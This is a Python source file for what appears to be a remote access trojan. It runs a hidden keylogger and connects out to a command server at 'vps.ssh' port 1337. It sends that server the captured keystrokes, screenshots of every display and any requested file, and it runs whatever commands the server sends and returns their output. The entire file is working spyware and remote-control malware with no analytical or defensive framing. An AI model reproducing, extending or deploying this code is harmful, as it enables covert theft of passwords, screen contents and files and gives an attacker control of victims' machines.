import io
import json
import os
import socket
import subprocess
import threading
import time

from PIL import ImageGrab
from pynput import keyboard

HOST = "vps.ssh"
PORT = 1337


# keylogger ---------------------------------------------------------------


class Keylogger(threading.Thread):
    def __init__(self) -> None:
        threading.Thread.__init__(self, daemon=True)
        self._keylogs = io.BytesIO()
        self._alt_state = False
        self._ctrl_state = False
        self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}

    def run(self) -> None:
        with keyboard.Listener(
            on_press=self._on_press, on_release=self._on_release
        ) as listener:
            listener.join()

    def get_keylogs(self) -> bytes:
        return self._keylogs.getvalue()

    def get_keylog_size(self) -> int:
        return self._keylogs.tell()

    def _on_press(self, key: keyboard.Key) -> None:
        pressed = None
        # if the key is control or alt, set the respective state to True
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = True
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = True
        # if the key is a letter
        else:
            if hasattr(key, "char") and hasattr(key, "vk"):
                if self._ctrl_state or self._alt_state:
                    # if the key is a letter and ctrl or alt is held, create a new format string
                    pressed = f"[{'CTRL+' if self._ctrl_state else ''}{'ALT+' if self._alt_state else ''}{chr(key.vk)}]"
                else:
                    # if the key is a letter and ctrl or alt is not held
                    pressed = key.char
            else:
                # if the key is not a letter, check the keymap dict for a match
                pressed = self._key_map.get(
                    key.name.split("_")[0], f"[{key.name.split('_')[0]}]"
                ).upper()
        # if a valid key has been pressed, add it to the keylogs
        if pressed:
            self._keylogs.write(bytes(pressed, "utf-8"))

    def _on_release(self, key: keyboard.Key) -> None:
        # if the key is control or alt, set the respective state to False
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self._ctrl_state = False
        if key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            self._alt_state = False


# utility functions ------------------------------------------------------------


def generate_info(category: str, size: int, extension: str, *, exists: bool = True):
    """returns a file data dict containing information about the file

    Args:
        category (str): category of the file, either "screenshot", "download" or "keylogs"
        size (int): size of the file in bytes
        extension (str): extension the file should be saved as
        exists (bool, optional): used for the download instruction, indicates whether the file exists. Defaults to True.

    Returns:
        _type_: _description_
    """
    return dict(
        file_category=category,
        file_size=size,
        file_extension=extension,
        file_exists=exists,
    )


def send(destination_socket: socket.socket, data: str or bytes) -> None:
    """sends any data to the destination socket

    Args:
        destination_socket (socket.socket): socket connected to the server
        data (strorbytes): data to be sent, will be encoded into bytes if anything but bytes is passed
    """
    destination_socket.sendall(
        str(data).encode("utf-8") if not isinstance(data, bytes) else data
    )


# handlers ----------------------------------------------------------------------


def screenshot(destination: socket.socket) -> None:
    """Takes an image of all possible displays and sends it to the destination socket

    Args:
        destination (socket.socket): socket connected to the server
    """
    # initialise BytesIO object to store the image data in memory
    image_bytes = io.BytesIO()
    # capture an image of the screens (all connected displays)
    ImageGrab.grab(bbox=None, all_screens=True).save(image_bytes, "PNG")
    # generate a file data dict containing information about the image
    image_data = generate_info("screenshot", image_bytes.tell(), ".png")
    # send the file data to the destination socket
    send(destination, json.dumps(image_data))
    time.sleep(1)
    # send the image data to the destination socket
    send(destination, image_bytes.getvalue())


def download(destination: socket.socket, file_path: str) -> None:
    """responds to the download instruction, locating the specified file and uploading it to the destination socket

    Args:
        destination (socket.socket): socket of the connected server
        file_path (str): path of the file to send
    """
    # check if the file related to the specified file path exists
    if not os.path.isfile(file_path):
        # if the file does not exist, make a file data dict indicating that the file does not exist
        file_data = generate_info("download", 0, "", exists=False)
    else:
        # if the file does exist, make a file data dict indicating that the file exists with information about the file
        file_data = generate_info(
            "download",
            os.path.getsize(file_path),
            os.path.splitext(file_path)[1],
            exists=True,
        )
    # send the file data dict to the server
    send(destination, json.dumps(file_data))
    # if the file exists, send the file to the server
    if file_data["file_exists"]:
        with open(file_path, "rb") as file:
            while True:
                buffer = file.read(1024)
                if not buffer:
                    break
                send(destination, buffer)


def keylogs(destination: socket.socket, keylogger: Keylogger) -> None:
    """responds to the keylogs instruction, sending the keylogs to the destination socket

    Args:
        destination (socket.socket): socket of the connected server
        keylogger (Keylogger): keylogger object responsible for logging keystrokes
    """
    # generate a file data dict containing information about the keylogs
    keylogs_data = generate_info("keylogs", keylogger.get_keylog_size(), ".txt")
    # send the file data dict to the destination socket (server)
    send(destination, json.dumps(keylogs_data))
    # send the keylogger data to the server
    send(destination, keylogger.get_keylogs())


def execute(destination: socket.socket, command: list) -> None:
    """responds to the execute instruction, executing the specified command and sending the output to the destination socket

    Args:
        destination (socket.socket): socket of the connected server
        command (list): command to execute
    """
    try:
        # create a new command execution process
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except OSError as e:
        # if an error occurs while creating the process, set the response to the error message
        response = bytes(f"{e.strerror}", "utf-8")
    else:
        try:
            # get the output of the process with a max execution of 10 seconds
            out, err = proc.communicate(timeout=10)
        except subprocess.TimeoutExpired:
            # if the process exceeds its timeout, kill it and set the response to the output so far
            proc.kill()
            out, err = proc.communicate()
        # set the response to the output of the process
        response = out if out else err
    # wait one second
    time.sleep(1)
    # send the response size to the destination socket
    send(destination, json.dumps(dict(output_size=len(response or b""))))
    if len(response or b"") > 0:
        # if there is a response with size > 0 send it to the destination socket (server)
        send(destination, response)


# main ---------------------------------------------------------------------------

if __name__ == "__main__":
    # initialise a new Keylogger object
    keylogger = Keylogger()
    # start the keylogger thread
    keylogger.start()

    # create a socket and use it to connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        while True:
            try:
                # connect to the server using the defined host IP and port number
                sock.connect((HOST, PORT))
                print("connected to server...")
                while True:
                    # receive data from the server
                    data = sock.recv(1024)
                    # if the data is empty, the connection has been closed
                    if not data:
                        break
                    try:
                        # decode the data from bytes to a json object
                        decoded = json.loads(data.decode("utf-8"))
                    except json.JSONDecodeError:
                        # if the data is not a json object, ignore it
                        continue
                    else:
                        print(decoded)
                        # if the instruction within the json object is "screenshot"
                        if decoded["instruction"] == "screenshot":
                            screenshot(sock)
                        # if the instruction within the json object is "keylogs"
                        elif decoded["instruction"] == "keylogs":
                            keylogs(sock, keylogger)
                        # if the instruction within the json object is "execute"
                        elif decoded["instruction"] == "execute":
                            execute(sock, decoded["arguments"].get("command"))
                        # if the instruction within the json object is "download"
                        elif decoded["instruction"] == "download":
                            download(sock, decoded["arguments"].get("file_path"))
            except OSError:
                print("unable to connect to server...")
                time.sleep(5)
                # if an OSError occurs, try to reconnect to the server
                continue
